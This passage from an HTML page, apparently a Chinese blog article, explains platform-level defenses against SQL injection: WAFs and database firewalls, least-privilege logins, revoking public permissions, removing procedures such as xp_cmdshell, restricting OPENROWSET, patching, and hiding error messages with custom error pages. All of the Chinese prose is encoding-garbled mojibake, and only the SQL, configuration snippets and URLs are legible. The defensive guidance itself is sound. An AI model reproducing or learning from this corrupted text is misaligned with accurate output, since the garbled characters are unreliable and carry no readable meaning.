IDS)æ¥æ£€æµ‹SQLæ³¨å…¥æ”»å‡»ã€‚</p><p>WAFä½œä¸ºä¸€ç§éå¸¸å¥½çš„IDSï¼Œå› ä¸ºå®ƒè¿è¡Œåœ¨åº”ç”¨å±‚å¹¶ä¸”å¯é’ˆå¯¹å—ä¿æŠ¤ çš„åº”ç”¨ç¨‹åºè¿›è¡Œå¾®è°ƒã€‚</p><p>å¦ä¸€ç§é€‰æ‹©æ˜¯ä½¿ç”¨PHPIDS<a href="http://phpids.org,phpidsä¸ä¼šè¿‡æ»¤æˆ–å®¡æŸ¥è¾“å…¥,å®ƒæ£€æµ‹æ”»å‡»å¹¶æ ¹æ®é…ç½®æ¥é‡‡å–æªæ–½./">http://phpids.orgï¼ŒPHPIDSä¸ä¼šè¿‡æ»¤æˆ–å®¡æŸ¥è¾“å…¥ï¼Œå®ƒæ£€æµ‹æ”»å‡»å¹¶æ ¹æ®é…ç½®æ¥é‡‡å–æªæ–½ã€‚</a></p><h4 id="æ•°æ®åº“é˜²ç«å¢™"><a href="#æ•°æ®åº“é˜²ç«å¢™" class="headerlink" title="æ•°æ®åº“é˜²ç«å¢™"></a>æ•°æ®åº“é˜²ç«å¢™</h4><p>é˜²ç«å¢™ï¼Œå®ƒæœ¬è´¨ä¸Šæ˜¯ä¸€ç§ä»‹äºåº”ç”¨ç¨‹åºå’Œæ•°æ®åº“ä¹‹é—´çš„ä»£ç†æœåŠ¡å™¨ã€‚åº”ç”¨ç¨‹åºè¿æ¥åˆ°æ•°æ®åº“é˜²ç«å¢™å¹¶åƒæ­£å¸¸è¿æ¥åˆ°æ•°æ®åº“é‚£æ ·å‘é€æŸ¥è¯¢ã€‚ æ•°æ®åº“é˜²ç«å¢™åˆ†æé¢„æœŸçš„æŸ¥è¯¢ï¼Œå¦‚æœè®¤ä¸ºæ˜¯å®‰å…¨çš„ï¼Œå°±å°†å®ƒä¼ é€’ç»™æ•°æ®åº“æœåŠ¡å™¨åŠ ä»¥æ‰§è¡Œã€‚åä¹‹ï¼Œå¦‚æœè®¤ä¸ºæ˜¯æ¶æ„çš„ï¼Œå°±é˜»æ­¢è¿è¡Œè¯¥æŸ¥è¯¢ã€‚æ•°æ®åº“é˜²ç«å¢™è¿˜å¯ä»¥é€šè¿‡ä»¥è¢«åŠ¨æ¨¡å¼ç›‘è§†è¿æ¥å’Œå‘ç®¡ç†å‘˜å‘å‡ºå¯ç–‘è¡Œä¸ºè­¦å‘Šæ¥ä½œä¸ºæ¶æ„æ•°æ®åº“è¡Œä¸ºçš„åº”ç”¨å±‚IDSã€‚</p><h3 id="ç¡®ä¿æ•°æ®åº“å®‰å…¨"><a href="#ç¡®ä¿æ•°æ®åº“å®‰å…¨" class="headerlink" title="ç¡®ä¿æ•°æ®åº“å®‰å…¨"></a>ç¡®ä¿æ•°æ®åº“å®‰å…¨</h3><h4 id="é”å®šåº”ç”¨ç¨‹åºæ•°æ®"><a href="#é”å®šåº”ç”¨ç¨‹åºæ•°æ®" class="headerlink" title="é”å®šåº”ç”¨ç¨‹åºæ•°æ®"></a>é”å®šåº”ç”¨ç¨‹åºæ•°æ®</h4><h5 id="ä½¿ç”¨è¾ƒä½æƒé™çš„æ•°æ®åº“ç™»å½•"><a href="#ä½¿ç”¨è¾ƒä½æƒé™çš„æ•°æ®åº“ç™»å½•" class="headerlink" title="ä½¿ç”¨è¾ƒä½æƒé™çš„æ•°æ®åº“ç™»å½•"></a>ä½¿ç”¨è¾ƒä½æƒé™çš„æ•°æ®åº“ç™»å½•</h5><p>åº”ç”¨ç¨‹åºè¿æ¥åˆ°æ•°æ®åº“æœåŠ¡å™¨çš„ç™»å½•è¯­å¢ƒåº”è¯¥æ˜¯ï¼šæ‹¥æœ‰çš„è®¸å¯æƒé™ä»…ä»…åªèƒ½æ‰§è¡Œéœ€è¦çš„åº”ç”¨ç¨‹åºä»»åŠ¡ã€‚</p><h5 id="éš”ç¦»æ•°æ®åº“ç™»å½•"><a href="#éš”ç¦»æ•°æ®åº“ç™»å½•" class="headerlink" title="éš”ç¦»æ•°æ®åº“ç™»å½•"></a>éš”ç¦»æ•°æ®åº“ç™»å½•</h5><p>å¯¹äºæ—¢éœ€è¦å†™è®¿é—®ä¹Ÿéœ€è¦è¯»è®¿é—®æ•°æ®åº“çš„åº”ç”¨ç¨‹åºï¼Œå¯ä»¥ä½¿ç”¨å¤šä¸ªç”¨æˆ·ç™»å½•æ•°æ®åº“ï¼Œè¿™æ˜¯å¯¹ä½¿ç”¨æœ€å°æƒé™ç™»å½•æ•°æ®åº“çš„æ‰©å±•ã€‚</p><h5 id="æ’¤é”€publicè®¸å¯"><a href="#æ’¤é”€publicè®¸å¯" class="headerlink" title="æ’¤é”€publicè®¸å¯"></a>æ’¤é”€publicè®¸å¯</h5><p>æ¯ç§æ•°æ®åº“æœåŠ¡å™¨å¹³å°å‡æ‹¥æœ‰é€šå¸¸ç§°ä¸ºå…¬å…±ï¼ˆpublicï¼‰è§’è‰²çš„é»˜è®¤è§’è‰²ï¼ˆæ‰€æœ‰ç™»å½•å‡å±äºè¿™ç§è§’è‰²ï¼‰ã€‚å®ƒåŒ…å«ä¸€ä¸ªé»˜è®¤çš„è®¸å¯é›†ï¼Œå…¶ä¸­åŒ…æ‹¬å¯¹ç³»ç»Ÿå¯¹è±¡çš„è®¿é—®ã€‚å…¬å…±è§’è‰²è¿˜è¢«èµ‹äºˆäº†æ‰§è¡Œå†…ç½®ç³»ç»Ÿå­˜å‚¨è¿‡ç¨‹ã€åŒ…å’Œç”¨äºç®¡ç†ç›®çš„çš„åŠŸèƒ½çš„è®¸å¯ã€‚</p><p>åº”å°½å¯èƒ½å¤šåœ°æ’¤é”€ç³»ç»Ÿå¯¹è±¡çš„å…¬å…±è§’è‰²è®¸å¯ã€‚æ­¤å¤–ï¼Œè¿˜å¿…é¡»æ’¤é”€ä¸ºè‡ªå®šä¹‰æ•°æ®åº“å¯¹è±¡ï¼ˆæ¯”å¦‚åº”ç”¨ç¨‹åºä½¿ç”¨çš„è¡¨å’Œå­˜å‚¨è¿‡ç¨‹ï¼‰èµ‹äºˆçš„å…¬å…±è§’è‰²çš„å†—ä½™è®¸å¯ï¼Œå¿…è¦æ—¶å¯ä»¥ä¸ºè‡ªå®šä¹‰è§’è‰²åˆ†é…æ•°æ®åº“è®¸å¯ã€‚å¯ä»¥ä½¿ç”¨è¿™äº›è§’è‰²æ¥ä¸ºç‰¹å®šçš„ç”¨æˆ·å’Œç»„èµ‹äºˆé»˜è®¤çš„è®¿é—®çº§åˆ«ã€‚</p><h5 id="ä½¿ç”¨å­˜å‚¨è¿‡ç¨‹"><a href="#ä½¿ç”¨å­˜å‚¨è¿‡ç¨‹" class="headerlink" title="ä½¿ç”¨å­˜å‚¨è¿‡ç¨‹"></a>ä½¿ç”¨å­˜å‚¨è¿‡ç¨‹</h5><p>ä»å®‰å…¨è§’åº¦çœ‹ï¼Œåº”è¯¥å°†åº”ç”¨ç¨‹åºçš„SQLæŸ¥è¯¢å°è£…åˆ°å­˜å‚¨è¿‡ç¨‹ä¸­å¹¶ä¸”åªèƒ½ä¸ºè¿™äº›å¯¹è±¡èµ‹äºˆEXECUTEè®¸å¯ã€‚å¯ä»¥æ’¤é”€åº•å±‚å¯¹è±¡çš„æ‰€æœ‰å…¶ä»–è®¸å¯ï¼Œæ¯”å¦‚SELECTï¼ŒINSERTç­‰ã€‚å°±SQLæ³¨å…¥è€Œè¨€ï¼Œæœ€ä½æƒé™çš„æ•°æ®åº“ç™»å½•ï¼ˆåº”ç”¨ç¨‹åºä½¿ç”¨çš„å­˜å‚¨è¿‡ç¨‹åªæ‹¥æœ‰EXECUTEè®¸å¯ï¼‰å¯ä¿è¯æ›´éš¾ å‘æµè§ˆå™¨è¿”å›ä»»æ„ç»“æœé›†ã€‚</p><h5 id="ä½¿ç”¨å¼ºåŠ å¯†æŠ€æœ¯æ¥ä¿æŠ¤å­˜å‚¨çš„æ•æ„Ÿæ•°æ®"><a href="#ä½¿ç”¨å¼ºåŠ å¯†æŠ€æœ¯æ¥ä¿æŠ¤å­˜å‚¨çš„æ•æ„Ÿæ•°æ®" class="headerlink" title="ä½¿ç”¨å¼ºåŠ å¯†æŠ€æœ¯æ¥ä¿æŠ¤å­˜å‚¨çš„æ•æ„Ÿæ•°æ®"></a>ä½¿ç”¨å¼ºåŠ å¯†æŠ€æœ¯æ¥ä¿æŠ¤å­˜å‚¨çš„æ•æ„Ÿæ•°æ®</h5><p>è¦æƒ³é¿å…æ•°æ®åº“ä¸­æ•æ„Ÿæ•°æ®çš„éæˆæƒæŸ¥çœ‹ï¼Œä¸€ç§å…³é”®çš„æ§åˆ¶å°±æ˜¯ä½¿ç”¨å¼ºåŠ å¯†æŠ€æœ¯ã€‚å¯é€‰çš„æ–¹æ³•åŒ…æ‹¬å­˜å‚¨æ•°æ®çš„æ•°å­¦å“ˆå¸Œï¼ˆè€Œéæ•°æ®æœ¬èº«ï¼‰æˆ–è€…å­˜å‚¨ä½¿ç”¨å¯¹ç§°ç®—æ³•åŠ å¯†åçš„æ•°æ®ã€‚</p><p>å¦‚æœä¸éœ€è¦å­˜å‚¨æ•°æ®æœ¬èº«ï¼Œé‚£ä¹ˆè¯·è€ƒè™‘ä¸€ç§æ­£ç¡®çš„è¡ç”Ÿæ•°å­¦å“ˆå¸Œã€‚</p><p>å¦‚æœå¿…é¡»å­˜å‚¨æ•æ„Ÿæ•°æ®ï¼Œè¯·ä½¿ç”¨å¼ºå¯¹ç§°åŠ å¯†ç®—æ³•æ¥è¿›è¡Œä¿æŠ¤ï¼Œæ¯”å¦‚AESï¼ˆAdvanced Encryption Standard,é«˜çº§åŠ å¯†æ ‡å‡†ï¼‰æˆ–ä¸‰é‡DESï¼ˆData Encryption Standard,æ•°æ®åŠ å¯†æ ‡å‡†ï¼‰ã€‚åŠ å¯†æ•æ„Ÿæ•°æ®çš„ä¸»è¦æŒ‘æˆ˜æ˜¯å°†å¯†é’¥ä¿å­˜åˆ°æ”»å‡»è€…æ— æ³•è½»æ˜“è®¿é—®åˆ°çš„ä½ç½®ã€‚</p><h5 id="ç»´æŠ¤å®¡æŸ¥è·Ÿè¸ª"><a href="#ç»´æŠ¤å®¡æŸ¥è·Ÿè¸ª" class="headerlink" title="ç»´æŠ¤å®¡æŸ¥è·Ÿè¸ª"></a>ç»´æŠ¤å®¡æŸ¥è·Ÿè¸ª</h5><p>ç»´æŠ¤å¯¹åº”ç”¨ç¨‹åºæ•°æ®åº“å¯¹è±¡çš„è®¿é—®å®¡æŸ¥è·Ÿè¸ªéå¸¸å…³é”®ã€‚</p><h5 id="Oracleé”™è¯¯è§¦å‘å™¨"><a href="#Oracleé”™è¯¯è§¦å‘å™¨" class="headerlink" title="Oracleé”™è¯¯è§¦å‘å™¨"></a>Oracleé”™è¯¯è§¦å‘å™¨</h5><p>Oracleæä¾›äº†ä¸€ç§åä¸ºæ•°æ®åº“è§¦å‘å™¨çš„ç‰¹æ€§ã€‚å½“å‡ºç°ç‰¹å®šçš„äº‹ä»¶æ—¶ï¼Œæ¯”å¦‚ä½¿ç”¨DDLï¼ˆæ•°æ®å®šä¹‰è¯­è¨€ï¼Œæ¯”å¦‚DDLè§¦å‘å™¨ï¼‰åˆ›å»ºå¯¹è±¡æ—¶ï¼Œæˆ–è€…å‡ºç°æ•°æ®åº“é”™è¯¯ï¼ˆæ¯”å¦‚ERRORè§¦å‘å™¨ï¼‰æ—¶ï¼Œè¿™äº›è§¦å‘å™¨ä¼šåœ¨æ•°æ®åº“èŒƒå›´å†…æ¿€æ´»ï¼Œä»è€Œæä¾›äº†ä¸€ç§ç®€æ˜“çš„æ–¹æ³•æ¥æ£€æµ‹SQLæ³¨å…¥å°è¯•ã€‚</p><h4 id="é”å®šæ•°æ®åº“æœåŠ¡å™¨"><a href="#é”å®šæ•°æ®åº“æœåŠ¡å™¨" class="headerlink" title="é”å®šæ•°æ®åº“æœåŠ¡å™¨"></a>é”å®šæ•°æ®åº“æœåŠ¡å™¨</h4><h5 id="é¢å¤–çš„ç³»ç»Ÿå¯¹è±¡é”å®š"><a href="#é¢å¤–çš„ç³»ç»Ÿå¯¹è±¡é”å®š" class="headerlink" title="é¢å¤–çš„ç³»ç»Ÿå¯¹è±¡é”å®š"></a>é¢å¤–çš„ç³»ç»Ÿå¯¹è±¡é”å®š</h5><p>é™¤äº†æ’¤é”€ç³»ç»Ÿå¯¹è±¡(system object)ä¸Šçš„å…¬å…±å¯¹è±¡è®¸å¯å¤–ï¼Œè¯·è€ƒè™‘é‡‡å–é¢å¤–çš„æ­¥éª¤æ¥è¿›ä¸€æ­¥é”å®šç‰¹æƒå¯¹è±¡çš„è®¿é—®ï¼Œæ¯”å¦‚ç”¨äºç³»ç»Ÿç®¡ç†çš„å¯¹è±¡ã€æ‰§è¡Œæ“ä½œç³»ç»Ÿå‘½ä»¤å’Œäº§ç”Ÿç½‘ç»œè¿æ¥çš„å¯¹è±¡ã€‚</p><p>è¯·è€ƒè™‘é€šè¿‡ä»¥ä¸‹æªæ–½æ¥æ–½åŠ çº¦æŸï¼šç¡®ä¿æœªå‘åº”ç”¨ç¨‹åºè§’è‰²èµ‹äºˆå¤šä½™å†—ä½™è®¸å¯ã€é€šè¿‡æœåŠ¡å™¨é…ç½®ç¦ç”¨è®¿é—®ç³»ç»ŸèŒƒå›´å†…çš„ç‰¹æƒå¯¹è±¡ï¼Œæˆ–è€…å½»åº•å°†è¿™äº›åŠŸèƒ½ä»æœåŠ¡å™¨åˆ é™¤(é¿å…é‡æ–°å¯ç”¨å¸¦æ¥çš„æƒé™æå‡)ã€‚</p><p>åœ¨Oracleä¸­ï¼Œåº”è¯¥çº¦æŸè¿è¡Œæ“ä½œç³»ç»Ÿçš„å‘½ä»¤ä»¥åŠä»æ•°æ®åº“è®¿é—®æ“ä½œç³»ç»Ÿçº§æ–‡ä»¶çš„èƒ½åŠ›ã€‚</p><p>åœ¨SQL Serverä¸­ï¼Œåº”è¯¥è€ƒè™‘åˆ é™¤å±é™©çš„å­˜å‚¨è¿‡ç¨‹ï¼Œæ¯”å¦‚xp_cmdshellä»¥åŠä¸xp_reg*ã€xp_ instancereg*å’Œsp_OA*åŒ¹é…çš„å­˜å‚¨è¿‡ç¨‹ã€‚</p><h5 id="çº¦æŸå³å¸­æŸ¥è¯¢ï¼ˆad-hoc-queryingï¼‰"><a href="#çº¦æŸå³å¸­æŸ¥è¯¢ï¼ˆad-hoc-queryingï¼‰" class="headerlink" title="çº¦æŸå³å¸­æŸ¥è¯¢ï¼ˆad hoc queryingï¼‰"></a>çº¦æŸå³å¸­æŸ¥è¯¢ï¼ˆad hoc queryingï¼‰</h5><p>Microsoft SQL Serveræ”¯æŒä¸€ç§åä¸ºOPENROWSETçš„å‘½ä»¤æ¥æŸ¥è¯¢è¿œç¨‹å’Œæœ¬åœ°æ•°æ®æºã€‚è¿œç¨‹æŸ¥è¯¢çš„æœ‰ç”¨ä¹‹å¤„åœ¨äºå¯åˆ©ç”¨å®ƒæ¥æ”»å‡»æ‰€è¿ç½‘ç»œä¸Šçš„å…¶ä»–æ•°æ®åº“æœåŠ¡å™¨ã€‚ä½¿ç”¨è¿™ä¸€åŠŸèƒ½æŸ¥è¯¢æœ¬åœ°æœåŠ¡å™¨ï¼Œæ”»å‡»è€…å¯ä»¥åœ¨æ›´é«˜ç‰¹æƒçš„SQL Serveræ•°æ®åº“ç™»å½•è¯­å¢ƒä¸­é‡æ–°å‘æœåŠ¡å™¨å‘å‡ºéªŒè¯ã€‚</p><p>Oracleæ”¯æŒå€ŸåŠ©æ•°æ®åº“é“¾æ¥ï¼ˆdatabase linkï¼‰çš„è¿œç¨‹æœåŠ¡å™¨çš„å³å¸­æŸ¥è¯¢ã€‚</p><h5 id="å¢å¼ºå¯¹éªŒè¯å‘¨è¾¹çš„æ§åˆ¶"><a href="#å¢å¼ºå¯¹éªŒè¯å‘¨è¾¹çš„æ§åˆ¶" class="headerlink" title="å¢å¼ºå¯¹éªŒè¯å‘¨è¾¹çš„æ§åˆ¶"></a>å¢å¼ºå¯¹éªŒè¯å‘¨è¾¹çš„æ§åˆ¶</h5><p>åº”è¯¥å¤æŸ¥æ‰€æœ‰æ•°æ®åº“ç™»å½•ï¼Œç¦ç”¨æˆ–åˆ é™¤ä¸å¿…è¦çš„å†…å®¹ï¼Œæ¯”å¦‚é»˜è®¤è´¦æˆ·ã€‚</p><h5 id="åœ¨æœ€ä½æƒé™çš„æ“ä½œç³»ç»Ÿè´¦æˆ·è¯­å¢ƒä¸­è¿è¡Œ"><a href="#åœ¨æœ€ä½æƒé™çš„æ“ä½œç³»ç»Ÿè´¦æˆ·è¯­å¢ƒä¸­è¿è¡Œ" class="headerlink" title="åœ¨æœ€ä½æƒé™çš„æ“ä½œç³»ç»Ÿè´¦æˆ·è¯­å¢ƒä¸­è¿è¡Œ"></a>åœ¨æœ€ä½æƒé™çš„æ“ä½œç³»ç»Ÿè´¦æˆ·è¯­å¢ƒä¸­è¿è¡Œ</h5><p>å¦‚æœæ”»å‡»è€…èƒ½å¤Ÿçªç ´æ•°æ®åº“æœåŠ¡å™¨è¯­å¢ƒå¹¶è·å–åº•å±‚æ“ä½œç³»ç»Ÿçš„è®¿é—®æƒï¼Œé‚£ä¹ˆæ­¤æ—¶æ˜¯å¦å¤„äºæœ€ä½æƒé™çš„æ“ä½œç³»ç»Ÿè´¦æˆ·è¯­å¢ƒä¸­å°†éå¸¸å…³é”®ã€‚</p><h5 id="ç¡®ä¿æ•°æ®åº“æœåŠ¡å™¨è½¯ä»¶æ‰“äº†è¡¥ä¸"><a href="#ç¡®ä¿æ•°æ®åº“æœåŠ¡å™¨è½¯ä»¶æ‰“äº†è¡¥ä¸" class="headerlink" title="ç¡®ä¿æ•°æ®åº“æœåŠ¡å™¨è½¯ä»¶æ‰“äº†è¡¥ä¸"></a>ç¡®ä¿æ•°æ®åº“æœåŠ¡å™¨è½¯ä»¶æ‰“äº†è¡¥ä¸</h5><p>ä½¿ç”¨å½“å‰çš„è¡¥ä¸ä¿è¯è½¯ä»¶æ›´æ–°è‡³æœ€æ–°æ˜¯ä¸€é¡¹åŸºæœ¬çš„å®‰å…¨è§„åˆ™</p><p>åˆ¤å®šSQL Server/Oracleæ•°æ®åº“æœåŠ¡å™¨ç‰ˆæœ¬</p><table><thead><tr><th align="center">æ•°æ®åº“</th><th align="center">å‘½ä»¤</th><th align="center">ç‰ˆæœ¬æŸ¥é˜…</th></tr></thead><tbody><tr><td align="center">SQL Server</td><td align="center">select @@version</td><td align="center"><a href="http://support.microsoft.com/kb/321185">http://support.microsoft.com/kb/321185</a></td></tr><tr><td align="center">Oracle</td><td align="center">â€“ æ˜¾ç¤ºæ•°æ®åº“ç‰ˆæœ¬ select * from v$version; â€“ æ˜¾ç¤ºå·²å®‰è£…ç»„ä»¶çš„ç‰ˆæœ¬ select * from dba_registry; â€“ æ˜¾ç¤ºè¡¥ä¸çº§åˆ« select * from dba_registry_history;</td><td align="center"><a href="http://www.oracle.com/techwrnetwork/topics/security/alerts-086861.html">http://www.oracle.com/techwrnetwork/topics/security/alerts-086861.html</a></td></tr></tbody></table><h3 id="é¢å¤–çš„éƒ¨ç½²è€ƒè™‘"><a href="#é¢å¤–çš„éƒ¨ç½²è€ƒè™‘" class="headerlink" title="é¢å¤–çš„éƒ¨ç½²è€ƒè™‘"></a>é¢å¤–çš„éƒ¨ç½²è€ƒè™‘</h3><h4 id="æœ€å°åŒ–ä¸å¿…è¦ä¿¡æ¯çš„æ³„éœ²"><a href="#æœ€å°åŒ–ä¸å¿…è¦ä¿¡æ¯çš„æ³„éœ²" class="headerlink" title="æœ€å°åŒ–ä¸å¿…è¦ä¿¡æ¯çš„æ³„éœ²"></a>æœ€å°åŒ–ä¸å¿…è¦ä¿¡æ¯çš„æ³„éœ²</h4><h5 id="éšè—é”™è¯¯æ¶ˆæ¯"><a href="#éšè—é”™è¯¯æ¶ˆæ¯" class="headerlink" title="éšè—é”™è¯¯æ¶ˆæ¯"></a>éšè—é”™è¯¯æ¶ˆæ¯</h5><p>åŒ…å«æè¿°æ•°æ®åº“æœåŠ¡å™¨å¤±è´¥åŸå› ä¿¡æ¯çš„é”™è¯¯æ¶ˆæ¯å¯¹SQLæ³¨å…¥è¯†åˆ«å’Œåç»­çš„æ¼æ´åˆ©ç”¨å‡éå¸¸æœ‰ç”¨ã€‚åœ¨åº”ç”¨ç¨‹åºçº§åˆ«çš„é”™è¯¯å¤„ç†ç¨‹åºä¸­ï¼Œå¤„ç†å¼‚å¸¸å’Œé”™è¯¯æ¶ˆæ¯éšè—ä¼šæå…¶æœ‰æ•ˆã€‚å¥½çš„åšæ³•æ˜¯é…ç½®åº”ç”¨æ¡†æ¶æˆ–WebæœåŠ¡å™¨ï¼Œä»¥ä¾¿åœ¨äº§ç”Ÿæœªé¢„æ–™çš„åº”ç”¨ç¨‹åºé”™è¯¯ï¼ˆæ¯”å¦‚åŒ…å«500çŠ¶æ€ç çš„HTTPå“åº”ï¼‰æ—¶è¿”å›è‡ªå®šä¹‰å“åº”ã€‚é…ç½®åçš„å“åº”å¯ä»¥æ˜¯æ˜¾ç¤ºé€šç”¨æ¶ˆæ¯çš„è‡ªå®šä¹‰é”™è¯¯é¡µé¢ï¼Œä¹Ÿå¯ä»¥é‡å®šå‘åˆ°é»˜è®¤çš„Webé¡µé¢ã€‚</p><p>è‡ªå®šä¹‰é”™è¯¯çš„é…ç½®æŠ€æœ¯</p><table><thead><tr><th align="center">å¹³   å°</th><th align="center">é…ç½®æŒ‡ä»¤</th></tr></thead><tbody><tr><td align="center">ASP.NET Webåº”ç”¨ç¨‹åº</td><td align="center">åœ¨ web.config æ–‡ä»¶ä¸­ï¼Œå°†customErrors è®¾ç½®ä¸º On æˆ– RemoteOnly  å¹¶å°†defaultRedirectè®¾ç½®ä¸ºè¦æ˜¾ç¤ºçš„é¡µé¢ã€‚ç¡®ä¿ä¸ºdefaultRedirecté…ç½®çš„é¡µé¢ç¡®å®ä½äºé…ç½®çš„ä½ç½®ï¼Œè¿™é€šå¸¸å®¹æ˜“å‡ºé”™ï¼<br>  <code>&lt;customErrors  mode="On"  defaultRedirect="/CustomPage.aspx"&gt;  &lt;/customErrors&gt;</code><br>  è¯¥é…ç½®åªé€‚ç”¨äºASP.NETèµ„æºã€‚å½“å‡ºç°ä»»ä½•åº”ç”¨ä»£ç æ— æ³•å¤„ç†çš„é”™è¯¯ï¼ˆ500ã€404ç­‰ï¼‰æ—¶å‡ä¼šæ˜¾ç¤ºè¯¥é…ç½®é¡µé¢ã€‚</td></tr><tr><td align="center">J2EE Webåº”ç”¨ç¨‹åº</td><td align="center">åœ¨web.xmlæ–‡ä»¶ä¸­ï¼Œä½¿ç”¨<code>&lt;error-code&gt;</code>å’Œ<code>&lt;location&gt;</code>å…ƒç´ é…ç½®<code>&lt;error-page&gt;</code>å…ƒç´ ï¼š<br><error-page><br><error-code>500</error-code><br><location>/CustomPage.html</location><br></error-page><br>è¯¥é…ç½®åªé€‚ç”¨äºä¸“é—¨ç”±Javaåº”ç”¨æœåŠ¡å™¨å¤„ç†çš„èµ„æºã€‚åªæœ‰å½“å‡ºç°500é”™è¯¯æ—¶æ‰ä¼šæ˜¾ç¤ºè¯¥é…ç½®é¡µé¢ã€‚</td></tr><tr><td align="center">ç»å…¸ASP/VBScript  Webåº”ç”¨ç¨‹åº</td><td align="center">å¿…é¡»å¯¹IISè¿›è¡Œé…ç½®ä»¥ä¾¿éšè—è¯¦ç»†çš„ASPé”™è¯¯æ¶ˆæ¯ã€‚å¯ä»¥ä½¿ç”¨ä¸‹åˆ—æ“ä½œé…ç½®è¯¥è®¾ç½®ï¼š<br>1. åœ¨â€IIS Manager Snap-Inâ€ä¸­å³å‡»Webç«™ç‚¹å¹¶é€‰æ‹©â€Propertiesâ€ã€‚<br>2.åœ¨â€Home Directoryâ€é€‰é¡¹å¡ä¸­å•å‡»â€Configurationâ€æŒ‰é’®ã€‚ç¡®ä¿é€‰ä¸­äº†â€Send text error message to clientâ€é€‰é¡¹ï¼Œå¹¶ä¸”è¯¥é€‰é¡¹ä¸‹çš„æ–‡æœ¬æ¡†ä¸­å­˜åœ¨æ°å½“çš„æ¶ˆæ¯ã€‚</td></tr><tr><td align="center">PHP Webåº”ç”¨ç¨‹åº</td><td align="center">åœ¨php.iniæ–‡ä»¶ä¸­ï¼Œè®¾ç½®display_errorsä¸ºOffã€‚æ­¤å¤–ï¼Œåœ¨WebæœåŠ¡å™¨é…ç½®ä¸­é…ç½®é»˜è®¤çš„é”™è¯¯æ–‡æ¡£ã€‚è¯·å‚è€ƒä¸‹é¢ä¸¤è¡Œè¡¨æ ¼ä¸­é’ˆå¯¹Apacheå’Œ IISçš„æŒ‡ä»¤ã€‚</td></tr><tr><td align="center">Apache WebæœåŠ¡å™¨</td><td align="center">å‘æŒ‡å‘è‡ªå®šä¹‰é¡µé¢çš„Apacheï¼ˆä½äºé…ç½®æ–‡ä»¶å†…éƒ¨ï¼Œé€šå¸¸ä¸ºhttpd.confï¼‰ æ·»åŠ  ErrorDocument æŒ‡ä»¤ï¼š  <code>ErrorDocument 500 /CustomPage.html</code></td></tr><tr><td align="center">IISæœåŠ¡å™¨</td><td align="center">å¯ä»¥ä½¿ç”¨ä¸‹åˆ—æ“ä½œé…ç½®IISä¸­çš„è‡ªå®šä¹‰é”™è¯¯ï¼š<br>ï¼ˆ1ï¼‰åœ¨â€IIS Manager Snap-Inâ€ä¸­å³å‡»Webç«™ç‚¹å¹¶é€‰æ‹©â€Propertiesâ€ã€‚<br>ï¼ˆ2ï¼‰åœ¨â€Custom Errorsâ€é€‰é¡¹å¡ä¸­å•å‡»â€Configurationâ€æŒ‰é’®ã€‚é€‰ä¸­éœ€è¦è‡ªå®šä¹‰çš„HTTPé”™è¯¯å¹¶å•å‡»â€Editâ€æŒ‰é’®ã€‚æ¥ä¸‹æ¥ä»â€Message Typeâ€<br>ä¸‹æ‹‰èœå•ä¸­é€‰æ‹©ä¸€ä¸ªæ–‡ä»¶æˆ–URLæ¥æ›¿æ¢é»˜è®¤å†…å®¹</td></tr></tbody></table><p>ä¸€ç§å¯ä»¥ä½¿åŸºäºå“åº”çš„é”™è¯¯æ£€æµ‹å˜å¾—å›°éš¾çš„æ–¹æ³•ï¼Œæ˜¯é…ç½®åº”ç”¨ç¨‹åºå’ŒWebæœåŠ¡å™¨ï¼Œä½¿ä¹‹è¿”å›ç›¸åŒçš„å“åº”ï¼Œæ¯”å¦‚ä¸ç®¡ä»€ä¹ˆé”™è¯¯ä»£ç ï¼ˆ401ã€403ã€500ç­‰ï¼‰å‡é‡å®šå‘åˆ°é»˜è®¤çš„é¦–é¡µã€‚</p><h5 id="ä½¿ç”¨ç©ºçš„é»˜è®¤Webç«™ç‚¹"><a href="#ä½¿ç”¨ç©ºçš„é»˜è®¤Webç«™ç‚¹" class="headerlink" title="ä½¿ç”¨ç©ºçš„é»˜è®¤Webç«™ç‚¹"></a>ä½¿ç”¨ç©ºçš„é»˜è®¤Webç«™ç‚¹</h5><p>HTTP/1.1åè®®è¦æ±‚HTTPå®¢æˆ·ç«¯åœ¨å‘é€ç»™WebæœåŠ¡å™¨çš„è¯·æ±‚ä¸­å‘é€ä¸»æœºå¤´éƒ¨ï¼ˆHost headerï¼‰ã€‚ä¸ºè®¿é—®ç‰¹å®šçš„Webç«™ç‚¹ï¼Œè¯¥å¤´éƒ¨å€¼å¿…é¡»ä¸WebæœåŠ¡å™¨çš„è™šæ‹Ÿä¸»æœºé…ç½®ä¸­çš„ä¸»æœºåç›¸åŒ¹é…ã€‚å¦‚æœæœªæ‰¾åˆ°åŒ¹é…å€¼ï¼Œå°†è¿”å›é»˜è®¤çš„Webç«™ç‚¹å†…å®¹ã€‚</p><p>å¯¹äºä¼ä¸šçº§Webåº”ç”¨ç¨‹åºçš„æ‹¥æœ‰è€…ï¼Œåˆ™å¯èƒ½æ›´å–œæ¬¢éšè”½èµ·æ¥ï¼Œä»–ä»¬ä¸å¸Œæœ›è¢«é’ˆå¯¹ç«¯å£80å’Œ443è¿›è¡ŒIPåœ°å€èŒƒå›´æ‰«æçš„æ”»å‡»è€…å‘ç°ã€‚ä¸ºç¡®ä¿ç”¨æˆ·åªèƒ½é€šè¿‡ä¸»æœºåè¿æ¥åˆ°Webåº”ç”¨ï¼Œéœ€è¦å°†WebæœåŠ¡å™¨çš„é»˜è®¤Webç«™ç‚¹é…ç½®æˆè¿”å›ä¸€ä¸ªç©ºç™½çš„é»˜è®¤Webé¡µé¢ã€‚</p><h5 id="ä¸ºDNSåå‘æŸ¥è¯¢ä½¿ç”¨è™šæ‹Ÿä¸»æœºåç§°"><a href="#ä¸ºDNSåå‘æŸ¥è¯¢ä½¿ç”¨è™šæ‹Ÿä¸»æœºåç§°" class="headerlink" title="ä¸ºDNSåå‘æŸ¥è¯¢ä½¿ç”¨è™šæ‹Ÿä¸»æœºåç§°"></a>ä¸ºDNSåå‘æŸ¥è¯¢ä½¿ç”¨è™šæ‹Ÿä¸»æœºåç§°</h5><p>å‰é¢è®²è¿‡ï¼Œå¦‚æœåªæ‹¥æœ‰IPåœ°å€ï¼Œè¦æƒ³åœ¨èƒ½å¤Ÿè®¿é—®Webç«™ç‚¹ä¹‹å‰å‘ç°æœ‰æ•ˆçš„ä¸»æœºåï¼Œå°±éœ€è¦èŠ±è´¹ä¸€äº›åŠŸå¤«ã€‚è¦å®ç°è¯¥ç›®æ 